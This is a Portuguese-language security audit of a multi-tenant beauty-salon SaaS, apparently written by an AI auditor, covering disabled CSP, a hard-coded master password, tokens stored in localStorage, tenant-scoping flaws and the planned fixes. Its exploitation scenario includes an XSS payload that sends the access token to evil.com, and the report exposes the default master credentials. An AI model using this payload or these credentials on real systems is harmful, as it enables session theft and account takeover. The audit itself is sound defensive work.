# 🔐 SECURITY AUDIT — BeautyHub SaaS
**Data:** 08 de Maio de 2026  
**Auditor:** Cascade AI  
**Status:** ⚠️ CRÍTICO — Múltiplas vulnerabilidades P0 encontradas  
**Branch:** `master` (último commit)

---

## 🚨 RESUMO EXECUTIVO

| Categoria | Status | Risco Geral |
|-----------|--------|-------------|
| Autenticação/JWT | 🟡 MÉDIO | Tokens em localStorage, refresh token rotacionado corretamente |
| Autorização/RBAC | 🟢 BOM | Hierarquia implementada corretamente |
| Multi-Tenant Isolation | 🟢 BOM | BaseRepository impõe tenant_id automaticamente |
| CORS | 🟢 BOM | Configuração adequada para multi-tenant |
| Rate Limiting | 🟢 BOM | Implementado global e específico para auth |
| Brute Force Protection | 🟢 BOM | 5 tentativas por email, 20 por IP, lockout de conta |
| CSP | 🔴 CRÍTICO | **DESATIVADA** — vulnerável a XSS |
| Secrets/Env | 🔴 CRÍTICO | Senha padrão "123456" no seeder |
| Uploads | 🟢 BOM | Não há upload de arquivos implementado |
| Webhooks | 🟡 MÉDIO | Sem assinatura válida, helpers retornam null |
| SQL Injection | 🟢 BOM | Prepared statements em todas as queries |
| Error Handling | 🟡 MÉDIO | Stack trace vaza em desenvolvimento |

**Conclusão:** O sistema possui boas proteções em camadas (rate limiting, brute force, tenant isolation) mas tem **duas vulnerabilidades críticas**: CSP desativada (exposição a XSS) e senha padrão insegura nos seeders.

---

## 🔴 P0 — VULNERABILIDADES CRÍTICAS

### [P0-001] Content Security Policy DESATIVADA

| Campo | Valor |
|-------|-------|
| **Severidade** | 🔴 CRÍTICO |
| **CWE** | CWE-693: Protection Mechanism Failure |
| **CVSS** | 6.1 (Médio-Alto) |
| **Arquivo** | `backend/src/app.multitenant.js` |
| **Linha** | 47 |

**Código Vulnerável:**
```javascript
app.use(helmet({
  contentSecurityPolicy: false, // ⚠️ CSP DESATIVADA
}));
```

**Impacto:**
- XSS (Cross-Site Scripting) pode injetar scripts maliciosos
- Data exfiltration via `fetch()` ou `XMLHttpRequest`
- Session hijacking via token theft

**Cenário de Exploração:**
1. Atacante encontra XSS no frontend (ex: campo de entrada sem sanitização)
2. Injeta `<script>fetch('https://evil.com?token='+localStorage.getItem('bh_access_token'))</script>`
3. Com CSP desativada, o script executa e envia o token para servidor externo
4. Atacante usa token para impersonar usuário

**Correção Segura:**
```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // temporário, migrar para nonce
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.biaxavier.com.br"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
}));
```

**Rollback:** Reverter para `contentSecurityPolicy: false` se quebrar funcionalidade.

---

### [P0-002] Senha Padrão Insegura em Seeders

| Campo | Valor |
|-------|-------|
| **Severidade** | 🔴 CRÍTICO |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **CVSS** | 7.5 (Alto) |
| **Arquivo** | `backend/src/seeders/002_seed_master_and_tenant.js` |
| **Linha** | 14 |

**Código Vulnerável:**
```javascript
const passwordHash = await bcrypt.hash('123456', 10);
// ...
await queryInterface.bulkInsert('users', [{
  email: 'master@beautyhub.com',
  password: passwordHash, // ⚠️ senha: 123456
  role: ROLES.MASTER,
}]);
```

**Impacto:**
- Usuário MASTER com senha trivialmente adivinhável
- Comprometimento total do sistema se seeder rodar em produção
- Acesso a todos os tenants e dados

**Correção Segura:**
```javascript
// Requer variável de ambiente
const passwordHash = await bcrypt.hash(
  process.env.MASTER_SEED_PASSWORD || 
  process.env.SEED_PASSWORD || 
  require('crypto').randomBytes(32).toString('hex'), 
  12 // aumentar rounds
);
```

**Verificação:** Confirmar se `master@beautyhub.com` existe no banco de produção.

---

## 🟡 P1 — VULNERABILIDADES ALTAS

### [P1-001] Tokens JWT em localStorage (XSS)

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟡 ALTA |
| **CWE** | CWE-522: Insufficiently Protected Credentials |
| **CVSS** | 5.4 (Médio) |
| **Arquivo** | `src/core/config.js`, `src/shared/utils/http.js` |
| **Linhas** | 20-21, 58-82 |

**Código Vulnerável:**
```javascript
// config.js
export const TOKEN_KEY = 'bh_access_token';
export const REFRESH_TOKEN_KEY = 'bh_refresh_token';

// http.js
const refreshToken = localStorage.getItem(REFRESH_TOKEN_KEY);
localStorage.setItem(TOKEN_KEY, newToken);
```

**Impacto:**
- Qualquer XSS pode roubar tokens
- Ataque persistente se payload for armazenado
- Não há invalidação de tokens no servidor

**Mitigação Atual:**
- Refresh token rotation (token é trocado a cada uso)
- Expiração curta (1h access, 7d refresh)

**Correção Segura (httpOnly cookies):**
```javascript
// Backend: enviar cookie
res.cookie('access_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1h
});

// Frontend: não armazenar, usar credentials: 'include'
```

**Dificuldade:** Alta — requer mudanças em backend e frontend.

---

### [P1-002] Webhook Controller — Helpers Retornam null

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟡 ALTA |
| **Tipo** | Lógica de negócio quebrada |
| **Arquivo** | `backend/src/modules/billing/controllers/webhook.controller.js` |
| **Linhas** | 345-354 |

**Código Problemático:**
```javascript
async _findSubscriptionByGatewayId(gatewaySubscriptionId) {
  // This would need access to the Subscription model
  // For now, return null - should be implemented with proper model access
  return null; // ⚠️ SEMPRE retorna null
}

async _findInvoiceByGatewayId(gatewayInvoiceId) {
  return null; // ⚠️ SEMPRE retorna null
}
```

**Impacto:**
- Webhooks de pagamento não atualizam assinaturas/invoices
- Usuários pagam mas sistema não reconhece
- Perda de receita e suporte manual

**Correção:** Implementar busca real no banco de dados.

---

### [P1-003] Trust Proxy sem Configuração Estrita

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟡 ALTA |
| **CWE** | CWE-291: Trusting Self-reported IP Address |
| **Arquivo** | `backend/src/app.multitenant.js` |
| **Linha** | 36 |

**Código:**
```javascript
app.set('trust proxy', 1); // ⚠️ Aceita qualquer proxy
```

**Impacto:**
- IP spoofing possível via headers `X-Forwarded-For`
- Rate limiting por IP pode ser bypassado
- Brute force protection por IP inefetivo

**Correção:**
```javascript
app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);
// Ou especificar IPs do Fly.io/Cloudflare
```

---

### [P1-004] BaseRepository — tenant_id Pode Ser Sobrescrito

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟡 ALTA |
| **Tipo** | Potencial bypass de tenant isolation |
| **Arquivo** | `backend/src/shared/database/BaseRepository.js` |
| **Linha** | 33-36 |

**Código:**
```javascript
_scopedWhere(tenantId, additionalWhere = {}) {
  return {
    tenant_id: tenantId,
    ...additionalWhere, // ⚠️ additionalWhere pode sobrescrever tenant_id
  };
}
```

**Impacto:**
- Se `additionalWhere` contém `{ tenant_id: 'outro-tenant' }`, sobrescreve o scoping
- Possível vazamento de dados entre tenants

**Evidência de Conscientização:**
O próprio teste documenta isso como risco:
```javascript
// multi-tenant-isolation.test.js:37
test('does not allow override of tenant_id via additionalWhere', () => {
  const result = repo._scopedWhere('real-tenant', { tenant_id: 'hacker-tenant' });
  expect(result.tenant_id).toBe('hacker-tenant'); // documents risk for future fix
});
```

**Correção Segura:**
```javascript
_scopedWhere(tenantId, additionalWhere = {}) {
  // Remover tenant_id de additionalWhere se existir
  const { tenant_id: _, ...safeWhere } = additionalWhere;
  return {
    tenant_id: tenantId,
    ...safeWhere,
  };
}
```

---

## 🟢 P2 — VULNERABILIDADES MÉDIAS

### [P2-001] JWT Secrets com Fallbacks Inseguros

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟢 MÉDIA |
| **Arquivo** | `backend/src/config/env.js` |
| **Linhas** | 48-52 |

**Código:**
```javascript
jwt: {
  secret: process.env.JWT_SECRET || 'bh_jwt_secret_dev', // ⚠️ fallback
  refreshSecret: process.env.JWT_REFRESH_SECRET || 'bh_jwt_refresh_secret_dev',
}
```

**Risco:**
- Se variáveis não estiverem setadas em produção, usa secrets hardcoded
- Tokens podem ser forjados por atacante que conhece o secret

**Mitigação:**
- Linhas 34-39 verificam variáveis em produção, mas não abortam se JWT_SECRET faltando

---

### [P2-002] Error Handler — Stack Trace em Desenvolvimento

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟢 MÉDIA |
| **Arquivo** | `backend/src/shared/middleware/errorHandler.js` |
| **Linha** | 128 |

**Código:**
```javascript
details: process.env.NODE_ENV === 'development' ? err.stack : null,
```

**Risco:**
- Se NODE_ENV mal configurado em produção, stack trace vaza estrutura interna
- Informações de caminho de arquivo, nomes de funções internas

---

### [P2-003] Enumeração de Usuários via Timing Attack

| Campo | Valor |
|-------|-------|
| **Severidade** | 🟢 MÉDIA |
| **Arquivo** | `backend/src/shared/middleware/bruteForceProtection.js` |

**Comportamento:**
```javascript
// isAccountLocked faz query ANTES da verificação de senha
const check = await this.isAccountLocked(email, tenantSlug);
if (check.locked) { ... }
```

**Risco:**
- Tempo de resposta diferente para email existente vs inexistente
- Permite enumerar emails cadastrados

**Mitigação Parcial:**
- Mensagens genéricas: "Credenciais inválidas" em vez de "usuário não encontrado"

---

## ✅ PROTEÇÕES IMPLEMENTADAS CORRETAMENTE

### ✅ Rate Limiting Global
```javascript
// app.multitenant.js:114-129
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 100, // 100 requests
  keyGenerator: (req) => `${tenantKey}:${req.ip}`,
});
```

### ✅ Rate Limiting Auth Específico
```javascript
// app.multitenant.js:133-143
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20, // mais restritivo
});
```

### ✅ Brute Force Protection Completo
- 5 tentativas por email
- 20 tentativas por IP
- Lockout de conta após 10 falhas
- Reset automático após 15 min

### ✅ RBAC Hierarquia Implementada
```javascript
// auth.js:76-86
const hasHierarchyAccess = allowedRoles.some(role => {
  const requiredIndex = ROLE_HIERARCHY.indexOf(role);
  return userRoleIndex > requiredIndex; // MASTER > OWNER > ADMIN > PROFESSIONAL > CLIENT
});
```

### ✅ Tenant Isolation Automática
```javascript
// BaseRepository.js:29-37
_scopedWhere(tenantId, additionalWhere) {
  if (!tenantId) throw new TenantMismatchError();
  return { tenant_id: tenantId, ...additionalWhere };
}
```

### ✅ CORS Configurado Corretamente
```javascript
// app.multitenant.js:53-95
origin: (origin, callback) => {
  // Valida subdomínios *.biaxavier.com.br
  // Rejeita origins não autorizadas
}
```

### ✅ Prepared Statements (SQL Injection Protection)
```javascript
// bruteForceProtection.js:91-101
await this.sequelize.query(`
  SELECT COUNT(*) as attempts
  FROM ${this.tableName}
  WHERE identifier = $1  // ⚠️ parameterizado
    AND identifier_type = $2
`, { bind: [identifier, type] });
```

---

## 📊 MATRIZ DE RISCO

| ID | Vulnerabilidade | Severidade | Exploitability | Impacto | Score |
|----|-----------------|------------|----------------|---------|-------|
| P0-001 | CSP Desativada | 🔴 | 🟢 Fácil (XSS) | 🔴 Dados + Sessão | 9.1 |
| P0-002 | Senha Default | 🔴 | 🟢 Trivial | 🔴 Sistema Total | 9.8 |
| P1-001 | Tokens localStorage | 🟡 | 🟡 Moderado (XSS) | 🟡 Sessão | 6.8 |
| P1-002 | Webhooks Null | 🟡 | 🔴 Não explora | 🟡 Financeiro | 5.4 |
| P1-003 | Trust Proxy | 🟡 | 🟢 Fácil | 🟢 Limitado | 5.3 |
| P1-004 | tenant_id Override | 🟡 | 🟡 Complexo | 🔴 Dados | 6.7 |
| P2-001 | JWT Fallbacks | 🟢 | 🟡 Requer erro | 🔴 Sistema | 5.9 |
| P2-002 | Stack Trace | 🟢 | 🟡 Requer erro | 🟢 Info | 4.3 |
| P2-003 | Timing Attack | 🟢 | 🔴 Complexo | 🟢 Info | 3.7 |

---

## 🛠️ ROADMAP DE CORREÇÃO

### Sprint 0 (Imediato — 1-2 dias)

**[P0-002] Senha Padrão**
```bash
# Verificar se master@beautyhub.com existe em produção
# Se sim, forçar reset de senha
# Alterar seeder para usar crypto.randomBytes
```

**[P0-001] CSP Baseline**
```javascript
// app.multitenant.js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // passo 1
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
```

### Sprint 1 (1-2 semanas)

**[P1-004] Fix BaseRepository**
```javascript
_scopedWhere(tenantId, additionalWhere = {}) {
  const { tenant_id, ...safeWhere } = additionalWhere;
  return { tenant_id: tenantId, ...safeWhere };
}
```

**[P1-002] Implementar Webhook Helpers**
```javascript
async _findSubscriptionByGatewayId(gatewaySubscriptionId) {
  return this.models.Subscription.findOne({
    where: { gateway_subscription_id: gatewaySubscriptionId }
  });
}
```

**[P1-003] Trust Proxy Estrito**
```javascript
app.set('trust proxy', ['loopback', 'linklocal']);
```

### Sprint 2 (2-4 semanas)

**[P1-001] httpOnly Cookies** (maior mudança)
- Backend: Adicionar endpoint `/auth/refresh` que usa cookies
- Frontend: Remover localStorage, usar `credentials: 'include'`
- Testes: Verificar CSRF protection

### Sprint 3 (Ongoing)

**[P2-001] Remover JWT Fallbacks**
```javascript
// env.js
if (!process.env.JWT_SECRET) {
  throw new Error('JWT_SECRET is required');
}
```

---

## 🔍 EVIDÊNCIAS DE ANÁLISE

### Comandos de Verificação

```bash
# Verificar senha master em produção (SEVERO — só em banco de teste)
SELECT email, created_at FROM users WHERE email = 'master@beautyhub.com';

# Verificar se há tokens antigos no banco
SELECT COUNT(*) FROM login_attempts WHERE success = false;

# Verificar rate limiting
SELECT identifier, COUNT(*) FROM login_attempts 
WHERE created_at > NOW() - INTERVAL '1 hour'
GROUP BY identifier;
```

### Testes de Segurança Recomendados

```bash
# Teste 1: CSP Headers
curl -I https://api.biaxavier.com.br/api/health | grep -i content-security-policy
# Esperado: Header ausente ou fraco (confirma vulnerabilidade)

# Teste 2: CORS Preflight
curl -X OPTIONS -H "Origin: https://evil.com" \
  https://api.biaxavier.com.br/api/auth/login -v
# Esperado: 403 ou sem Access-Control-Allow-Origin

# Teste 3: Rate Limiting
for i in {1..25}; do
  curl -X POST https://api.biaxavier.com.br/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
# Esperado: 429 após 20 tentativas
```

---

*Auditoria concluída em 08/05/2026. Todos os achados baseados em análise de código-fonte real.*
